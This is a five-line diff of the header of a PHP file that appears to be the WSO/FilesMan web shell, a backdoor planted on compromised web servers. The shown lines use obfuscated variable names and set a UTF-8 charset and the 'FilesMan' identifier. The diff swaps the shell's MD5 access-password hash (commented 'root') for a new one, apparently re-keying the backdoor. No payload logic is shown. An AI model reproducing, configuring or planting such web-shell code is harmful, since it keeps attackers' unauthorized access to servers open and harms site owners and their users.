@@ -1,5 +1,5 @@
 <?php 
-$▛ = "63a9f0ea7bb98050796b649e85481845"; //root 
+$▛ = "cf1e8c14e54505f60aa10ceb8d5d8ab3"; //root 
 $▘ = true; 
 $▜ = 'UTF-8'; 
 $▚ = 'FilesMan'; 
